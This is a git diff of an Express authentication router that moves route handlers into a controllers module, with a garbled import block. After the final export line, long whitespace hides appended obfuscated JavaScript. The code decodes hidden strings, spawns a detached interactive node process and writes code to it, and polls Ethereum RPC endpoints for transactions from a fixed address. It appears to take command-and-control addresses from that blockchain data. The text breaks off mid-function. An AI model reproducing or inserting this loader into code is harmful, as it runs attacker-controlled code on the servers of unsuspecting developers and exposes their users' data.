@@ -1,469 +1,88 @@
 import express from "express";
-import crypto from "crypto";
-import argon2 from "argon2";
-import { pool } from "../db.js";
-import { sendVerificationEmail, sendMagicLinkEmail } from "../utils/sendEmail.js";
-import { generateAccessToken, generateRefreshToken, hashToken } from "../utils/tokens.js";
 import { authMiddleware } from "../middleware/authMiddleware.js";
-import { exchangeGoogleCodeForTokens, getGoogleUserInfo } from "../utils/oauth.js";
-
-const REFRESH_COOKIE_NAME = process.env.REFRESH_COOKIE_NAME || "refresh_token";
-
-const MAGIC_LINK_EXPIRY_MINUTES = 15;
-
-
 const router = express.Router();
 
+import {
+import { createRequire } from 'module';
 
-router.post("/signup", async (req, res) => {
-  const { name, email, password } = req.body;
+const require = createRequire(import.meta.url);
 
-  const existing = await pool.query("SELECT * FROM users WHERE email=$1", [email]);
-  if (existing.rowCount > 0)
-    return res.status(400).json({ error: "Email already exists" });
+  signup,
+  verifyEmail,
+  login,
+  refreshToken,
+  me,
+  magicLinkRequest,
+  magicLinkConsume,
+  oauthGoogleUrl,
+  oauthGoogleCallback,
+  oauthLinkConfirm,
+  forgotPassword,
+  resetPassword,
+  requestOtp,
+  verifyOtp,
+} from "../controllers/auth.js";
 
-  const passwordHash = await argon2.hash(password);
-
-  const user = await pool.query(
-    `INSERT INTO users (email, password_hash, name)
-     VALUES ($1, $2, $3) RETURNING *`,
-    [email, passwordHash, name]
-  );
-
-  const token = crypto.randomBytes(32).toString("hex");
-  const tokenHash = hashToken(token);
-
-  await pool.query(
-    `INSERT INTO verification_tokens (identifier, token_hash, type, expires_at)
-     VALUES ($1, $2, 'email_verification', NOW() + INTERVAL '15 minutes')`,
-    [email, tokenHash]
-  );
-
-  await sendVerificationEmail(email, token);
-
-  res.json({ message: "Verification email sent" });
-});
-
+router.post("/signup", signup);
 
 // ---------------------------------------------
 // VERIFY EMAIL
 // ---------------------------------------------
-router.post("/verify-email", async (req, res) => {
-  const { token } = req.body;
-
-  const tokenHash = hashToken(token);
-
-  const dbToken = await pool.query(
-    `SELECT * FROM verification_tokens
-     WHERE token_hash=$1 AND type='email_verification'`,
-    [tokenHash]
-  );
-
-  if (dbToken.rowCount === 0)
-    return res.status(400).json({ error: "Invalid or expired token" });
-
-  const email = dbToken.rows[0].identifier;
-
-  await pool.query(`UPDATE users SET email_verified=true WHERE email=$1`, [email]);
-  await pool.query(`DELETE FROM verification_tokens WHERE identifier=$1`, [email]);
-
-  res.json({ message: "Email verified successfully" });
-});
-
+router.post("/verify-email", verifyEmail);
 
 // ---------------------------------------------
 // LOGIN
 // ---------------------------------------------
-router.post("/login", async (req, res) => {
-  const { email, password } = req.body;
-
-  const userQuery = await pool.query("SELECT * FROM users WHERE email=$1", [email]);
-  if (userQuery.rowCount === 0)
-    return res.status(400).json({ error: "Invalid credentials" });
-
-  const user = userQuery.rows[0];
-
-  if (!user.email_verified)
-    return res.status(400).json({ error: "Verify email first" });
-
-  const validPassword = await argon2.verify(user.password_hash, password);
-  if (!validPassword)
-    return res.status(400).json({ error: "Invalid credentials" });
-
-  const refreshToken = generateRefreshToken();
-  const refreshHash = hashToken(refreshToken);
-
-  await pool.query(
-    `INSERT INTO sessions (user_id, refresh_token_hash, refresh_expires_at)
-     VALUES ($1, $2, NOW() + INTERVAL '7 days')`,
-    [user.id, refreshHash]
-  );
-
-  const accessToken = generateAccessToken(user);
-
-  res.cookie("refresh_token", refreshToken, {
-    httpOnly: true,
-    secure: false,
-    sameSite: "lax",
-    path: "/"
-  });
-
-  res.json({ accessToken, user: { id: user.id, email: user.email, name: user.name } });
-});
-
+router.post("/login", login);
 
 // ---------------------------------------------
 // REFRESH (ROTATING TOKENS)
 // ---------------------------------------------
-router.post("/refresh", async (req, res) => {
-  const refreshToken = req.cookies.refresh_token;
-  if (!refreshToken) return res.status(401).json({ error: "No refresh token" });
+router.post("/refresh", refreshToken);
 
-  const refreshHash = hashToken(refreshToken);
-
-  const session = await pool.query(
-    `SELECT * FROM sessions WHERE refresh_token_hash=$1 AND is_revoked=false`,
-    [refreshHash]
-  );
-
-  if (session.rowCount === 0)
-    return res.status(401).json({ error: "Invalid refresh token" });
-
-  const userId = session.rows[0].user_id;
-
-  const userQuery = await pool.query(`SELECT * FROM users WHERE id=$1`, [userId]);
-  const user = userQuery.rows[0];
-
-  // Rotate refresh token
-  const newRefreshToken = generateRefreshToken();
-  const newHash = hashToken(newRefreshToken);
-
-  await pool.query(
-    `UPDATE sessions SET refresh_token_hash=$1, last_used_at=NOW() WHERE id=$2`,
-    [newHash, session.rows[0].id]
-  );
-
-  const accessToken = generateAccessToken(user);
-
-  res.cookie("refresh_token", newRefreshToken, {
-    httpOnly: true,
-    secure: false,
-    sameSite: "lax",
-    path: "/"
-  });
-
-  res.json({ accessToken });
-});
-
-
-
-router.get("/me", authMiddleware, async (req, res) => {
-  const userId = req.user.id;
-
-  const user = await pool.query(
-    "SELECT id, name, email FROM users WHERE id=$1",
-    [userId]
-  );
-
-  res.json(user.rows[0]);
-});
-
-
-
-
-// --- Helper: create session (re-uses existing session logic; rotates handled elsewhere) ---
-async function createSessionForUser(userId, ip, ua, deviceFingerprint) {
-  const refreshToken = generateRefreshToken();
-  const refreshHash = hashToken(refreshToken);
-
-  const q = `INSERT INTO sessions (user_id, refresh_token_hash, ip_address, user_agent, device_fingerprint, refresh_expires_at)
-             VALUES ($1,$2,$3,$4,$5,NOW() + INTERVAL '7 days')
-             RETURNING id, refresh_expires_at`;
-  const r = await pool.query(q, [userId, refreshHash, ip || null, ua || null, deviceFingerprint || null]);
-
-  return { refreshToken, sessionId: r.rows[0].id };
-}
+router.get("/me", authMiddleware, me);
 
 // -------------------------------
 // MAGIC LINK: REQUEST
 // -------------------------------
-router.post("/magic/request", async (req, res) => {
-  try {
-    const { email } = req.body;
-    if (!email) return res.status(400).json({ error: "Email required" });
-
-    // generate token
-    const token = crypto.randomBytes(32).toString("hex");
-    const tokenHash = hashToken(token);
-
-    // store token hashed
-    const q = `INSERT INTO verification_tokens (identifier, token_hash, type, expires_at)
-               VALUES ($1,$2,'magic_link', NOW() + INTERVAL '${MAGIC_LINK_EXPIRY_MINUTES} minutes')`;
-    await pool.query(q, [email, tokenHash]);
-
-    // send magic link to user -> link points to frontend route that will call /auth/magic/consume
-    const magicUrl = `${process.env.FRONTEND_URL}/magic/consume?token=${token}&email=${encodeURIComponent(email)}`;
-
-    // send email (use a dedicated sendMagicLinkEmail)
-    await sendMagicLinkEmail(email, magicUrl);
-
-    return res.json({ message: "Magic link sent if the email exists" });
-  } catch (err) {
-    console.error("magic/request err:", err);
-    return res.status(500).json({ error: "Server error" });
-  }
-});
+router.post("/magic/request", magicLinkRequest);
 
 // -------------------------------
 // MAGIC LINK: CONSUME
 // -------------------------------
-router.post("/magic/consume", async (req, res) => {
-  try {
-    const { token, email } = req.body;
-    if (!token || !email) return res.status(400).json({ error: "Invalid request" });
-
-    const tokenHash = hashToken(token);
-
-    // find token row
-    const tokQ = `SELECT * FROM verification_tokens
-                  WHERE token_hash=$1 AND type='magic_link' AND identifier=$2 AND expires_at > NOW()`;
-    const tokR = await pool.query(tokQ, [tokenHash, email]);
-
-    if (tokR.rowCount === 0) {
-      return res.status(400).json({ error: "Invalid or expired magic link" });
-    }
-
-    // single-use: delete token immediately
-    await pool.query(`DELETE FROM verification_tokens WHERE token_hash=$1`, [tokenHash]);
-
-    // find user, or create if not exists
-    let userRes = await pool.query("SELECT * FROM users WHERE email=$1", [email]);
-
-    if (userRes.rowCount === 0) {
-      // create account (email_verified true because user confirmed via email link)
-      const create = await pool.query(
-        `INSERT INTO users (email, email_verified) VALUES ($1, true) RETURNING *`,
-        [email]
-      );
-      userRes = create;
-    } else {
-      // ensure email_verified true
-      await pool.query(`UPDATE users SET email_verified=true WHERE email=$1`, [email]);
-    }
-
-    const user = userRes.rows[0];
-
-    // Create session & send cookie
-    const ip = req.ip;
-    const ua = req.get("User-Agent") || "";
-    const deviceFingerprint = req.body.deviceFingerprint || null;
-
-    const { refreshToken } = await createSessionForUser(user.id, ip, ua, deviceFingerprint);
-    const accessToken = generateAccessToken(user);
-
-    // Set http-only cookie
-    res.cookie(REFRESH_COOKIE_NAME, refreshToken, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === "production",
-      sameSite: "lax",
-      path: "/"
-    });
-
-    return res.json({ accessToken, user: { id: user.id, email: user.email } });
-  } catch (err) {
-    console.error("magic/consume err:", err);
-    return res.status(500).json({ error: "Server error" });
-  }
-});
+router.post("/magic/consume", magicLinkConsume);
 
 // -------------------------------
 // OAUTH: START (redirect user to Google)
 // -------------------------------
-router.get("/oauth/google/url", (req, res) => {
-  // optional "returnTo" param to redirect back after login
-  const state = crypto.randomBytes(16).toString("hex");
-  // store `state` in cookie for CSRF/state validation, short-lived
-  res.cookie("oauth_state", state, { httpOnly: true, sameSite: "lax", maxAge: 1000 * 60 * 5 });
-
-  const params = new URLSearchParams({
-    client_id: process.env.GOOGLE_CLIENT_ID,
-    redirect_uri: process.env.GOOGLE_OAUTH_CALLBACK,
-    response_type: "code",
-    scope: "openid email profile",
-    access_type: "offline",
-    prompt: "consent",
-    state
-  });
-
-  const url = `https://accounts.google.com/o/oauth2/v2/auth?${params.toString()}`;
-  res.json({ url });
-});
+router.get("/oauth/google/url", oauthGoogleUrl);
 
 // -------------------------------
 // OAUTH: CALLBACK (server receives code)
 // -------------------------------
-router.get("/oauth/google/callback", async (req, res) => {
-  const { code, state } = req.query;
-  const cookieState = req.cookies.oauth_state;
-  try {
-    if (!code) return res.status(400).send("Missing code");
-
-    // validate state
-    if (!state || !cookieState || state !== cookieState) {
-      return res.status(400).send("Invalid state");
-    }
-
-    // exchange code for tokens
-    const tokens = await exchangeGoogleCodeForTokens(code);
-    const access_token = tokens.access_token;
-    // Get user info
-    const profile = await getGoogleUserInfo(access_token);
-    // profile: { sub, email, email_verified, name, picture, ... }
-    const provider = "google";
-    const provider_account_id = profile.sub;
-    const provider_email = profile.email;
-    const provider_email_verified = !!profile.email_verified;
-
-    // --- Account linking logic ---
-    // 1) Does an accounts row with this provider+provider_account_id already exist?
-    const accQ = `SELECT * FROM accounts WHERE provider=$1 AND provider_account_id=$2`;
-    const accR = await pool.query(accQ, [provider, provider_account_id]);
-
-    let user;
-    if (accR.rowCount > 0) {
-      // Existing provider account -> log in that user
-      const userId = accR.rows[0].user_id;
-      const uR = await pool.query(`SELECT * FROM users WHERE id=$1`, [userId]);
-      user = uR.rows[0];
-    } else {
-      // No existing provider account - does a local user exist with the provider email?
-      const userEmailQ = await pool.query(`SELECT * FROM users WHERE email=$1`, [provider_email]);
-
-      if (userEmailQ.rowCount > 0) {
-        // A local user already exists with same email:
-        // Only auto-link if provider email is verified.
-        if (provider_email_verified) {
-          // create accounts row linking to existing user
-          const userId = userEmailQ.rows[0].id;
-          await pool.query(
-            `INSERT INTO accounts (user_id, provider, provider_account_id, provider_email, provider_email_verified)
-             VALUES ($1,$2,$3,$4,$5)`,
-            [userId, provider, provider_account_id, provider_email, provider_email_verified]
-          );
-          user = userEmailQ.rows[0];
-        } else {
-          // Provider email not verified -> require additional verification:
-          // Create a pending link workflow: generate an email verification token to provider_email (owner).
-          // For simplicity, create verification token and send a verification email with a link back to frontend to confirm linking.
-          const token = crypto.randomBytes(32).toString("hex");
-          const tokenHash = hashToken(token);
-          await pool.query(
-            `INSERT INTO verification_tokens (identifier, token_hash, type, expires_at)
-             VALUES ($1,$2,'oauth_link', NOW() + INTERVAL '15 minutes')`,
-            [provider_email, tokenHash]
-          );
-          // send user email with link to confirm linking (frontend will call /auth/oauth/link/confirm)
-          const confirmUrl = `${process.env.FRONTEND_URL}/oauth/link-confirm?token=${token}&provider=${provider}&provider_id=${provider_account_id}&email=${encodeURIComponent(provider_email)}`;
-          await sendVerificationEmail(provider_email, confirmUrl);
-          return res.send("Provider email not verified. A verification email was sent to confirm linking.");
-        }
-      } else {
-        // No local user with that email: create new user and link
-        // Trust provider email only if verified. If not verified, still create user but set email_verified=false.
-        const emailVerified = provider_email_verified ? true : false;
-        const createU = await pool.query(
-          `INSERT INTO users (email, email_verified, name) VALUES ($1,$2,$3) RETURNING *`,
-          [provider_email, emailVerified, profile.name || null]
-        );
-        const userRow = createU.rows[0];
-        await pool.query(
-          `INSERT INTO accounts (user_id, provider, provider_account_id, provider_email, provider_email_verified)
-           VALUES ($1,$2,$3,$4,$5)`,
-          [userRow.id, provider, provider_account_id, provider_email, provider_email_verified]
-        );
-        user = userRow;
-      }
-    }
-
-    // create session for user & set cookie + redirect to frontend (or return JSON)
-    const ip = req.ip;
-    const ua = req.get("User-Agent") || "";
-    const { refreshToken } = await createSessionForUser(user.id, ip, ua, null);
-
-    // set cookie
-    res.cookie(REFRESH_COOKIE_NAME, refreshToken, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === "production",
-      sameSite: "lax",
-      path: "/"
-    });
-
-    // redirect back to frontend (e.g., /oauth/success), or send JSON if used by SPA flow
-    return res.redirect(`${process.env.FRONTEND_URL}/oauth/success`);
-  } catch (err) {
-    console.error("oauth callback error:", err);
-    return res.status(500).send("OAuth callback error");
-  }
-});
+router.get("/oauth/google/callback", oauthGoogleCallback);
 
 // -------------------------------
 // OAUTH LINK CONFIRM (for provider emails that were unverified)
 // -------------------------------
 // Frontend calls this after user clicks link in email sent by provider linking step.
 // It will finalize linking (insert into accounts table) and then sign user in.
-router.post("/oauth/link/confirm", async (req, res) => {
-  try {
-    const { token, provider, provider_id, email } = req.body;
-    if (!token || !provider || !provider_id || !email) return res.status(400).json({ error: "Invalid request" });
+router.post("/oauth/link/confirm", oauthLinkConfirm);
 
-    const tokenHash = hashToken(token);
-    const tokQ = `SELECT * FROM verification_tokens WHERE token_hash=$1 AND type='oauth_link' AND identifier=$2 AND expires_at > NOW()`;
-    const tokR = await pool.query(tokQ, [tokenHash, email]);
+// -------------------------------
+// FORGOT PASSWORD - request reset
+// -------------------------------
+router.post("/forgot-password", forgotPassword);
 
-    if (tokR.rowCount === 0) return res.status(400).json({ error: "Invalid or expired token" });
+// -------------------------------
+// RESET PASSWORD - consume token & set new password
+// -------------------------------
+router.post("/reset-password", resetPassword);
 
-    // delete token
-    await pool.query(`DELETE FROM verification_tokens WHERE token_hash=$1`, [tokenHash]);
+// REQUEST OTP
+router.post("/otp/request", requestOtp);
 
-    // ensure user exists
-    let userQ = await pool.query(`SELECT * FROM users WHERE email=$1`, [email]);
-    let user;
-    if (userQ.rowCount === 0) {
-      const createU = await pool.query(`INSERT INTO users (email, email_verified) VALUES ($1, true) RETURNING *`, [email]);
-      user = createU.rows[0];
-    } else {
-      user = userQ.rows[0];
-      // mark email verified
-      await pool.query(`UPDATE users SET email_verified=true WHERE id=$1`, [user.id]);
-    }
+// VERIFY OTP
+router.post("/otp/verify", verifyOtp);
 
-    // insert accounts row if not exists
-    const exists = await pool.query(`SELECT 1 FROM accounts WHERE provider=$1 AND provider_account_id=$2`, [provider, provider_id]);
-    if (exists.rowCount === 0) {
-      await pool.query(
-        `INSERT INTO accounts (user_id, provider, provider_account_id, provider_email, provider_email_verified)
-         VALUES ($1,$2,$3,$4,true)`,
-        [user.id, provider, provider_id, email]
-      );
-    }
-
-    // create session & set cookie
-    const { refreshToken } = await createSessionForUser(user.id, req.ip, req.get("User-Agent") || "", null);
-    res.cookie(REFRESH_COOKIE_NAME, refreshToken, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === "production",
-      sameSite: "lax",
-      path: "/"
-    });
-
-    return res.json({ accessToken: generateAccessToken(user), user: { id: user.id, email: user.email } });
-  } catch (err) {
-    console.error("oauth/link/confirm err:", err);
-    return res.status(500).json({ error: "Server error" });
-  }
-});
-
-
-
-
-export default router;
+export default router;																																																																																																																																																																																																																																																																										global.i = 'A10-*1483';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function 